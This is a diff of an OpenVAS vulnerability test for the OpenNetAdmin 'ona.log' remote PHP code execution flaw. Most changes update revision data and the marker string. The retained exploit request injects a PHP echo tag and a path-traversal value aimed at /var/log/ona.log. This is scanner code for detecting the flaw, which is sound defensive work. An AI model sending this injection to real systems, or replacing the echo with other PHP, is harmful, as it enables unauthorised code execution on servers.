@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_opennetadmin_61004.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_opennetadmin_61004.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability
 #
@@ -31,10 +31,10 @@ if (description)
   script_bugtraq_id(61004);
   script_tag(name:"cvss_base", value:"9.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 11497 $");
   script_name("OpenNetAdmin 'ona.log' File Remote PHP Code Execution Vulnerability");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61004");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2013-08-13 15:18:42 +0200 (Tue, 13 Aug 2013)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -62,6 +62,7 @@ affected.");
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
@@ -80,8 +81,10 @@ foreach dir( make_list_unique( "/ona", cgi_dirs( port:port ) ) ) {
 
 if( ! install ) exit( 0 );
 
-check = 'openvas_test_' + rand() + '_' + unixtime();
-mod_name = 'openvas_' + rand() + '_' + unixtime();
+vtstring = get_vt_string( lowercase:TRUE );
+
+check = vtstring + '_test_' + rand() + '_' + unixtime();
+mod_name = vtstring + '_' + rand() + '_' + unixtime();
 
 ex = 'options%5Bdesc%5D=%3C%3Fphp+echo+%27' + check  + '%27+%3F%3E&module=add_module&options%5Bname%5D=' + mod_name + '&options%5Bfile%5D=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fona.log';
 
